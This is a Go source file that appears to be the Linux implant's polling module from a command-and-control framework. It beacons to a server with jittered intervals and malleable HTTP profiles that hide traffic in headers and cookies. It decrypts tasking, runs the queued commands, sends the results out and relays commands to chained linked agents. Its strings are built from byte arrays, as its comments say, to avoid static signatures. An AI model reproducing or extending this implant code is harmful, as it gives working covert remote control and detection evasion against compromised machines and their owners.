// server/docker/payloads/Linux/polling.go

//go:build linux
// +build linux

package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Polling strings (constructed to avoid static signatures)
var (
	pollContentTypeJson   = string([]byte{0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6a, 0x73, 0x6f, 0x6e})                                                       // application/json
	pollStatusKey         = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                                                                                   // status
	pollCmdRekey          = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79})                                                                                                                         // rekey
	pollStatusNoCommands  = string([]byte{0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x73})                                                                                     // no_commands
	pollKeyAgentID        = string([]byte{0x61, 0x67, 0x65, 0x6e, 0x74, 0x5f, 0x69, 0x64})                                                                                                       // agent_id
	pollKeyResults        = string([]byte{0x72, 0x65, 0x73, 0x75, 0x6c, 0x74, 0x73})                                                                                                             // results
	pollKeyLinkUnlink     = string([]byte{0x6c, 0x75})                                                                                                                                           // lu
	pollKeyRoutingID      = string([]byte{0x72})                                                                                                                                                 // r
	pollKeyPayload        = string([]byte{0x70})                                                                                                                                                 // p
	pollMsgType           = string([]byte{0x74, 0x79, 0x70, 0x65})                                                                                                                               // type
	pollMsgPayload        = string([]byte{0x70, 0x61, 0x79, 0x6c, 0x6f, 0x61, 0x64})                                                                                                             // payload
	pollTypeHandshakeResp = string([]byte{0x68, 0x61, 0x6e, 0x64, 0x73, 0x68, 0x61, 0x6b, 0x65, 0x5f, 0x72, 0x65, 0x73, 0x70, 0x6f, 0x6e, 0x73, 0x65})                                           // handshake_response
)

// Malleable field values (constructed to avoid static signatures)
var (
	MALLEABLE_REKEY_COMMAND             = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})          // rekey_required
	MALLEABLE_REKEY_STATUS_FIELD        = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                          // status
	MALLEABLE_REKEY_DATA_FIELD          = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                      // data
	MALLEABLE_REKEY_ID_FIELD            = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                // command_db_id
	MALLEABLE_LINK_DATA_FIELD           = string([]byte{0x6c, 0x64})                                                                                  // ld
	MALLEABLE_LINK_COMMANDS_FIELD       = string([]byte{0x6c, 0x63})                                                                                  // lc
	MALLEABLE_LINK_HANDSHAKE_FIELD      = string([]byte{0x6c, 0x68})                                                                                  // lh
	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = string([]byte{0x6c, 0x72})                                                                                  // lr
)

// PollConfig holds the configuration for polling behavior
type PollConfig struct {
	GetURL          string
	PostURL         string
	DecryptedValues map[string]string
}

var (
	commandQueue    *CommandQueue
	resultManager   *ResultManager
	currentPolling  *sync.WaitGroup
	pollingShutdown chan struct{}
	pollingMutex    sync.Mutex
	rekeyInProgress atomic.Bool // Prevent concurrent rekey operations
)

func init() {
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()
	currentPolling = &sync.WaitGroup{}
	pollingShutdown = make(chan struct{})
}

// deriveXORKey creates the same XOR key as the server
func deriveXORKey(clientID, secret string) []byte {
	// Must match server implementation exactly
	combined := clientID + ":" + secret
	hash := sha256.Sum256([]byte(combined))
	return hash[:32]
}

// xorDecryptBytes decrypts byte array using XOR
func xorDecryptBytes(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// tryDecryptResponse attempts to find and decrypt the XOR encrypted field
func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[string]interface{}, error) {
	// Try each field in the response
	for _, fieldValue := range rawResponse {
		// Skip non-string fields
		strValue, ok := fieldValue.(string)
		if !ok {
			continue
		}

		// Try to base64 decode
		encrypted, err := base64.StdEncoding.DecodeString(strValue)
		if err != nil {
			continue // Not valid base64, skip
		}

		// Try to XOR decrypt
		decrypted := xorDecryptBytes(encrypted, xorKey)

		// Try to parse as JSON
		var response map[string]interface{}
		if err := json.Unmarshal(decrypted, &response); err != nil {
			continue // Not valid JSON after decryption, skip
		}

		// Check if it has expected fields (status is required)
		if _, hasStatus := response[pollStatusKey]; hasStatus {
			return response, nil
		}
	}

	return nil, fmt.Errorf(Err(E18))
}

// checkAsyncBOFResults checks for pending async BOF results (Windows only)
// This function is only compiled and called on Windows where bofJobManager exists

// calculateJitteredInterval applies jitter to the base sleep interval
func calculateJitteredInterval(baseSeconds int, jitterPercent float64, r *rand.Rand) time.Duration {
	baseInterval := time.Duration(baseSeconds) * time.Second
	jitterFactor := jitterPercent / 100.0
	maxVariation := float64(baseInterval) * jitterFactor
	variation := (r.Float64()*2 - 1) * maxVariation
	jitteredInterval := time.Duration(float64(baseInterval) + variation)
	return jitteredInterval
}

// sendResults sends encrypted results to the server
func sendResults(encryptedData string, customHeaders map[string]string) error {
	// Get current URLs dynamically
	_, postURL := handshakeManager.GetCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues

	// Get transform DataBlocks
	_, postClientIDDataBlock, postDataDataBlock, _ := handshakeManager.GetTransformDataBlocks()

	method := decryptedValues[geKeyPostMethod]
	if method == "" {
		method = geMethodPost
	}

	var bodyData []byte
	var transformedData []byte
	var prependLen, appendLen int
	var dataOutputLocation string

	// Check if POST data transforms are configured
	if postDataDataBlock != nil && len(postDataDataBlock.Transforms) > 0 {
		// Apply transforms to the encrypted data
		result, err := applyTransforms([]byte(encryptedData), postDataDataBlock.Transforms)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
		transformedData = result.Data
		prependLen = result.PrependLength
		appendLen = result.AppendLength
		dataOutputLocation = postDataDataBlock.Output

		// Check if output is body or elsewhere
		locType, _ := parseOutput(dataOutputLocation)
		if locType == "body" {
			bodyData = transformedData
		} else {
			// Data goes in header/cookie/query - send empty or minimal body
			bodyData = []byte("{}")
		}
	} else {
		// Legacy: wrap in JSON
		postData := struct {
			Data string `json:"data"`
		}{
			Data: encryptedData,
		}
		jsonData, err := json.Marshal(postData)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
		bodyData = jsonData
		dataOutputLocation = "body"
	}

	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(bodyData))
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Set content type based on transform mode
	if postDataDataBlock != nil && len(postDataDataBlock.Transforms) > 0 {
		// For transformed data, use content type from decrypted values or default
		contentType := decryptedValues[geKeyContentType]
		if contentType != "" {
			req.Header.Set(httpHeaderContentType, contentType)
		}
	} else {
		req.Header.Set(httpHeaderContentType, pollContentTypeJson)
	}

	req.Header.Set(httpHeaderUserAgent, decryptedValues[geKeyUserAgent])

	// Add padding length headers if random transforms were used
	if prependLen > 0 {
		req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", prependLen))
	}
	if appendLen > 0 {
		req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", appendLen))
	}

	// Apply clientID transforms if configured
	if postClientIDDataBlock != nil && len(postClientIDDataBlock.Transforms) > 0 {
		result, err := applyTransforms([]byte(clientID), postClientIDDataBlock.Transforms)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
		placeInLocation(req, postClientIDDataBlock.Output, result.Data, result.PrependLength, result.AppendLength)
	}

	// Place POST data in configured location (if not body)
	if dataOutputLocation != "" && dataOutputLocation != "body" {
		locType, _ := parseOutput(dataOutputLocation)
		if locType != "body" {
			placeInLocation(req, dataOutputLocation, transformedData, prependLen, appendLen)
			if prependLen > 0 {
				req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", prependLen))
			}
			if appendLen > 0 {
				req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", appendLen))
			}
		}
	}

	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: time.Second * 30,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer func() {
		io.Copy(io.Discard, resp.Body) // drain body
		resp.Body.Close()              // then close
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf(ErrCtx(E12, fmt.Sprintf("%d", resp.StatusCode)))
	}

	return nil
}

// doPoll performs a single poll cycle
func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
	getURL, _ := handshakeManager.GetCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues
	getClientIDDataBlock, _, _, responseDataDataBlock := handshakeManager.GetTransformDataBlocks()

	method := decryptedValues[geKeyGetMethod]
	if method == "" {
		method = geMethodGet
	}

	req, err := http.NewRequest(method, getURL, nil)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}

	// Apply clientID transforms if configured
	if getClientIDDataBlock != nil {
		if len(getClientIDDataBlock.Transforms) > 0 {
			result, err := applyTransforms([]byte(clientID), getClientIDDataBlock.Transforms)
			if err != nil {
				return fmt.Errorf(ErrCtx(E18, err.Error()))
			}
			placeInLocation(req, getClientIDDataBlock.Output, result.Data, result.PrependLength, result.AppendLength)
		} else {
			placeInLocation(req, getClientIDDataBlock.Output, []byte(clientID), 0, 0)
		}
	}

	req.Header.Set(httpHeaderUserAgent, decryptedValues[geKeyUserAgent])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	// Create HTTP client with TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: time.Second * 30,
	}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf(ErrCtx(E12, err.Error()))
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf(ErrCtx(E10, err.Error()))
	}

	// Use a generic response map instead of struct to support malleable field names
	var responseMap map[string]interface{}

	// Check if response transforms are configured
	if responseDataDataBlock != nil && len(responseDataDataBlock.Transforms) > 0 {
		// Get padding lengths from response headers
		prependLen, _ := strconv.Atoi(resp.Header.Get(httpHeaderPadPre))
		appendLen, _ := strconv.Atoi(resp.Header.Get(httpHeaderPadApp))

		locType, locName := parseOutput(responseDataDataBlock.Output)

		var responseData []byte
		switch locType {
		case "header":
			headerValue := resp.Header.Get(locName)
			if headerValue == "" {
				return fmt.Errorf(ErrCtx(E18, ""))
			}
			responseData, err = base64.StdEncoding.DecodeString(headerValue)
			if err != nil {
				return fmt.Errorf(ErrCtx(E18, err.Error()))
			}
		case "cookie":
			for _, cookie := range resp.Cookies() {
				if cookie.Name == locName {
					responseData, err = base64.StdEncoding.DecodeString(cookie.Value)
					if err != nil {
						return fmt.Errorf(ErrCtx(E18, err.Error()))
					}
					break
				}
			}
			if responseData == nil {
				return fmt.Errorf(ErrCtx(E18, ""))
			}
		default:
			responseData = body
		}

		body, err = reverseTransforms(responseData, responseDataDataBlock.Transforms, prependLen, appendLen)
		if err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}

		currentSecret := secureComms.secret1
		xorKey := deriveXORKey(clientID, currentSecret)
		decrypted := xorDecryptBytes(body, xorKey)

		if err := json.Unmarshal(decrypted, &responseMap); err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}
	} else {
		// Legacy: no transforms - body is JSON with encrypted field inside
		// First try to parse as raw JSON
		var rawResponse map[string]interface{}
		if err := json.Unmarshal(body, &rawResponse); err != nil {
			return fmt.Errorf(ErrCtx(E18, err.Error()))
		}

		// Check if this is an XOR encrypted response
		// Try to detect by checking if the malleable status field exists
		if _, hasStatus := rawResponse[MALLEABLE_REKEY_STATUS_FIELD]; !hasStatus && len(rawResponse) > 0 {
			// Likely encrypted, try to decrypt

			// Get current secret from secureComms
			currentSecret := secureComms.secret1 // Direct access to field
			xorKey := deriveXORKey(clientID, currentSecret)

			decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
			if err != nil {
				// Couldn't decrypt, use raw response
				responseMap = rawResponse
			} else {
				// Successfully decrypted
				responseMap = decryptedMap
			}
		} else {
			// Unencrypted response
			responseMap = rawResponse
		}
	}

	// Extract values using malleable field names
	var responseStatus string
	var responseData string
	var responseCommandDBID interface{}

	if statusVal, ok := responseMap[MALLEABLE_REKEY_STATUS_FIELD]; ok {
		if s, ok := statusVal.(string); ok {
			responseStatus = s
		}
	}
	if dataVal, ok := responseMap[MALLEABLE_REKEY_DATA_FIELD]; ok {
		if d, ok := dataVal.(string); ok {
			responseData = d
		}
	}
	if cmdIDVal, ok := responseMap[MALLEABLE_REKEY_ID_FIELD]; ok {
		responseCommandDBID = cmdIDVal
	}

	// Check for rekey command (special status that doesn't require decryption)
	// Debug: Print the compile-time MALLEABLE_REKEY_COMMAND value
	//fmt.Printf("[DEBUG] MALLEABLE_REKEY_COMMAND compiled value: %q\n", MALLEABLE_REKEY_COMMAND)
	//fmt.Printf("[DEBUG] response status from server: %q\n", responseStatus)
	if responseStatus == MALLEABLE_REKEY_COMMAND {
		//fmt.Println("[DEBUG] Received rekey command from server - MATCH FOUND!")

		// Extract command DB ID for the rekey result
		var commandDBID int
		switch v := responseCommandDBID.(type) {
		case float64:
			commandDBID = int(v)
		case int:
			commandDBID = v
		case string:
			commandDBID, _ = strconv.Atoi(v)
		}

		// Execute rekey command directly without decryption
		//fmt.Println("[DEBUG] Executing rekey command...")

		// Create result for the rekey command first (before triggering rekey)
		rekeyResult := &CommandResult{
			Command: Command{
				Command:     pollCmdRekey,
				CommandDBID: commandDBID,
				AgentID:     clientID,
			},
			CompletedAt: time.Now().Format(time.RFC3339),
			Output:      Succ(S15),
			ExitCode:    0,
		}

		// Queue the result to be sent back
		if err := resultManager.AddResult(rekeyResult); err != nil {
		} else {
		}

		// Perform handshake refresh in a separate goroutine to avoid deadlock
		// Use atomic flag to prevent multiple concurrent rekey operations
		if rekeyInProgress.CompareAndSwap(false, true) {
			go func() {
				defer rekeyInProgress.Store(false)
				//fmt.Println("[DEBUG] Starting rekey in background...")
				if err := refreshHandshake(); err != nil {
				} else {
					//fmt.Println("[DEBUG] Rekey completed successfully")
				}
			}()
		}

		// Return immediately - the new goroutine will handle the rekey
		// This allows the current polling goroutine to exit cleanly
		return fmt.Errorf(Err(E19))
	}

	// IMPORTANT: Process handshake responses BEFORE commands!
	// The TCP agent is waiting in performHandshake for the handshake_response.
	// If we send a command first, the TCP agent will receive "data" when expecting
	// "handshake_response", fail the handshake, and close the connection.

	if linkRespVal, ok := responseMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
		if linkRespData, ok := linkRespVal.([]interface{}); ok {
			processLinkHandshakeResponses(linkRespData)
		}
	}

	// Now process link commands (for forwarding to TCP agents after handshake is complete)
	// These are in the outer layer, not encrypted with our key
	if linkCmdsVal, ok := responseMap[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
		if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
			processLinkCommands(linkCmdsData)

			// After processing link commands, immediately send any queued responses
			// This enables faster round-trip for linked agent commands
			linkData := GetLinkManager().GetOutboundData()
			if len(linkData) > 0 {
				sendImmediateLinkData(secureComms, customHeaders, linkData)
			}
		}
	}

	// Check for no commands
	if responseStatus == pollStatusNoCommands {
		return nil
	}

	// Normal encrypted command processing
	if responseData != "" {
		decrypted, err := secureComms.DecryptMessage(responseData)
		if err != nil {
			if rekeyInProgress.CompareAndSwap(false, true) {
				go func() {
					defer rekeyInProgress.Store(false)
					refreshHandshake()
				}()
			}
			return nil
		}

		commandQueue.AddCommands(decrypted)

		for {
			result, err := commandQueue.ProcessNextCommand()
			if err != nil {
				continue
			}
			if result == nil {
				break
			}
			resultManager.AddResult(result)
		}
		secureComms.RotateSecret()
	}

	return nil
}

// sendImmediateLinkData sends link data to the server without waiting for the next poll cycle
// This enables faster round-trip for linked agent command responses
func sendImmediateLinkData(secureComms *SecureComms, customHeaders map[string]string, linkData []*LinkDataOut) {
	if len(linkData) == 0 {
		return
	}

	// Build payload with only link data
	payload := make(map[string]interface{})
	payload[pollKeyAgentID] = clientID
	payload[MALLEABLE_LINK_DATA_FIELD] = linkData

	jsonData, err := json.Marshal(payload)
	if err != nil {
		// Re-queue the data so it's not lost
		requeueLinkData(linkData)
		return
	}

	encrypted, err := secureComms.EncryptMessage(string(jsonData))
	if err != nil {
		// Re-queue the data so it's not lost
		requeueLinkData(linkData)
		return
	}

	if err := sendResults(encrypted, customHeaders); err != nil {
		// Re-queue the data so it's not lost - will be sent on next poll cycle
		requeueLinkData(linkData)
	} else {
		secureComms.RotateSecret()
	}
}

// requeueLinkData puts link data back into the outbound queue when immediate send fails
func requeueLinkData(linkData []*LinkDataOut) {
	lm := GetLinkManager()
	for _, item := range linkData {
		lm.queueOutboundData(item)
	}
}

// processLinkCommands forwards commands from the server to linked TCP agents
// and waits briefly for responses to enable faster round-trips
func processLinkCommands(linkCmds []interface{}) {
	lm := GetLinkManager()

	// Timeout for waiting for command responses
	const commandResponseTimeout = 5 * time.Second

	for _, cmd := range linkCmds {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			continue
		}

		// Extract routing ID and payload using malleable field names
		routingID, _ := cmdMap[pollKeyRoutingID].(string)
		payload, _ := cmdMap[pollKeyPayload].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Extract transform padding lengths (if present, use raw mode)
		prependLen := 0
		appendLen := 0
		transformed := false
		if pre, ok := cmdMap["pre"].(float64); ok {
			prependLen = int(pre)
		}
		if app, ok := cmdMap["app"].(float64); ok {
			appendLen = int(app)
		}
		// Check for transform flag (used when transforms don't have random padding)
		if t, ok := cmdMap["t"].(bool); ok && t {
			transformed = true
		}

		// Forward to the linked agent and wait for response
		var response *LinkDataOut
		var err error

		if transformed || prependLen > 0 || appendLen > 0 {
			// Transforms are used - forward raw bytes
			response, err = lm.ForwardToLinkedAgentRawAndWait(routingID, payload, prependLen, appendLen, commandResponseTimeout)
		} else {
			// Legacy mode - wrap in JSON envelope
			response, err = lm.ForwardToLinkedAgentAndWait(routingID, payload, commandResponseTimeout)
		}

		if err != nil {
			continue
		}

		if response != nil {
			lm.queueOutboundData(response)
		}
	}
}

// processLinkHandshakeResponses forwards handshake responses from server to TCP agents
func processLinkHandshakeResponses(responses []interface{}) {
	lm := GetLinkManager()

	for _, resp := range responses {
		respMap, ok := resp.(map[string]interface{})
		if !ok {
			continue
		}

		// Extract routing ID and payload
		routingID, _ := respMap[pollKeyRoutingID].(string)
		payload, _ := respMap[pollKeyPayload].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Get the linked agent - use direct map access to bypass IsActive check
		// Handshake responses are critical and should be attempted even if link appears inactive
		lm.mu.RLock()
		link, exists := lm.links[routingID]
		lm.mu.RUnlock()

		if !exists || link == nil {
			continue
		}

		// Send handshake response to TCP agent
		// Include the lr array for forwarding to grandchildren (TCP chains)
		message := map[string]interface{}{
			pollMsgType:    pollTypeHandshakeResp,
			pollMsgPayload: payload,
			"lr":           []interface{}{respMap}, // Include for forwarding to grandchildren
		}

		data, err := json.Marshal(message)
		if err != nil {
			continue
		}

		// Try to send regardless of IsActive - the TCP agent may be waiting with long timeout
		link.mu.Lock()
		if link.Conn != nil {
			if err := writeMessage(link.Conn, data); err == nil {
				link.LastSeen = time.Now()
				// Re-activate link if it was marked inactive due to read timeout
				if !link.IsActive {
					link.IsActive = true
				}
			}
		}
		link.mu.Unlock()
	}
}

// startPolling initializes and starts the polling routine
func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
	secureComms := handshakeManager.GetSecureComms()
	if secureComms == nil {
		secureComms = NewSecureComms(
			handshakeManager.decryptedValues[geKeySecret],
			sysInfo.AgentInfo.Seed,
		)
	}

	pollingMutex.Lock()
	pollingShutdown = make(chan struct{})
	pollingMutex.Unlock()

	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	customHeaders, err := parseCustomHeaders(handshakeManager.decryptedValues[geKeyCustomHeaders])
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	currentPolling.Add(1)

	go func() {
		// Ensure we call Done when goroutine exits
		defer currentPolling.Done()

		consecutiveErrors := 0
		maxBackoffMultiplier := 5

		// Add label for outer loop
	pollingLoop:
		for {
			// Check for shutdown signal at the start of each iteration
			select {
			case <-pollingShutdown:
				//fmt.Println("Polling shutdown signal received, exiting polling loop")
				return
			default:
				// Continue with polling
			}

			// Get current sleep and jitter values at start of each iteration
			baseSeconds, err := strconv.Atoi(sleep)
			if err != nil {
				baseSeconds = 30 // Default to 30 seconds if invalid
			}

			// Get current jitter value
			jitterValue, err := strconv.ParseFloat(jitter, 64)
			if err != nil {
				jitterValue = 10.0 // Default to 10% if invalid
			}

			nextInterval := calculateJitteredInterval(baseSeconds, jitterValue, r)
			if consecutiveErrors > 0 {
				backoffMultiplier := math.Min(float64(consecutiveErrors), float64(maxBackoffMultiplier))
				backoffInterval := time.Duration(float64(nextInterval) * math.Pow(2, backoffMultiplier))
				nextInterval = backoffInterval
			}

			// Collect link data from connected TCP agents (if any)
			linkData := GetLinkManager().GetOutboundData()
			// Collect link handshake data (for new linked agents, sent via "lh" field)
			linkHandshake := GetLinkManager().GetHandshakeData()
			// Collect unlink notifications (routing IDs that have been disconnected)
			unlinkNotifications := GetLinkManager().GetUnlinkNotifications()

			// Handle pending results before sleep
			hasResults := resultManager.HasResults()
			hasLinkData := len(linkData) > 0
			hasLinkHandshake := linkHandshake != nil
			hasUnlinkNotifications := len(unlinkNotifications) > 0

			if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
				results := resultManager.GetPendingResults()
				payload := make(map[string]interface{})
				payload[pollKeyAgentID] = clientID

				if len(results) > 0 {
					payload[pollKeyResults] = results
				}
				if hasLinkData {
					payload[MALLEABLE_LINK_DATA_FIELD] = linkData
				}
				if hasLinkHandshake {
					// Send handshake as single object via "lh" field
					payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake
				}
				if hasUnlinkNotifications {
					payload[pollKeyLinkUnlink] = unlinkNotifications
				}

				jsonData, err := json.Marshal(payload)
				if err == nil {
					encrypted, err := secureComms.EncryptMessage(string(jsonData))
					if err == nil {
						if err := sendResults(encrypted, customHeaders); err == nil {
							for _, result := range results {
								if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
									commandQueue.mu.Lock()
									if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
										delete(commandQueue.activeDownloads, result.Filename)
									}
									commandQueue.mu.Unlock()
								}
							}
							secureComms.RotateSecret()

							// If we just sent a handshake, do an immediate poll to get the response
							// instead of waiting for the full poll interval
							if hasLinkHandshake {
								time.Sleep(500 * time.Millisecond) // Brief delay for server processing
								doPoll(secureComms, customHeaders)
							}
						}
					}
				}
			}

			// Check for shutdown before sleep
			select {
			case <-pollingShutdown:
				//fmt.Println("Polling shutdown requested before sleep, exiting...")
				return
			case <-time.After(nextInterval):
				// Continue with next poll
			}

			// Perform the poll AFTER sleep
			if err := doPoll(secureComms, customHeaders); err != nil {
				// Check if this is a rekey in progress - if so, exit the entire goroutine
				if err.Error() == E19 {
					//fmt.Println("Rekey initiated, exiting current polling loop")
					break pollingLoop // Break out of the outer for loop
				}
				// Check for decryption failures
				if strings.Contains(err.Error(), E18) {
					// Could trigger automatic rekey here if needed
				}
				consecutiveErrors++
			} else {
				consecutiveErrors = 0
			}
		}
	}()

	return nil
}

// StopPolling signals the current polling routine to stop and waits for it to finish
func StopPolling() {
	//fmt.Println("Stopping current polling routine...")

	pollingMutex.Lock()
	if pollingShutdown != nil {
		close(pollingShutdown)
		pollingShutdown = nil // Set to nil instead of creating new channel
	}
	pollingMutex.Unlock()

	// Wait with timeout to prevent hanging
	done := make(chan struct{})
	go func() {
		currentPolling.Wait()
		close(done)
	}()

	select {
	case <-done:
		//fmt.Println("Polling routine stopped successfully")
	case <-time.After(10 * time.Second):
		//fmt.Println("Warning: Polling routine stop timed out after 10 seconds")
	}

	// Reset only the WaitGroup, NOT the channel
	pollingMutex.Lock()
	currentPolling = &sync.WaitGroup{}
	// Don't recreate pollingShutdown here - leave it nil
	pollingMutex.Unlock()
}
